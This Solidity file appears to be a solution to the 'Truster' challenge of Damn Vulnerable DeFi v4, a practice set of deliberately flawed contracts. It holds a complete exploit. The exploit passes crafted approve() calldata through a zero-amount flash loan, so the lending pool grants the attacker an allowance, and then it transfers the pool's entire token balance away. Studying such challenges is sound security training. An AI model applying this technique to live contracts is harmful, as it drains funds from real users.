// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attacker {
    
    function attack(address _pool, address _token, address _recovery) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        DamnValuableToken token = DamnValuableToken(_token);
        uint256 TOKENS_IN_POOL = 1_000_000e18;
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), _recovery, TOKENS_IN_POOL);
    }

}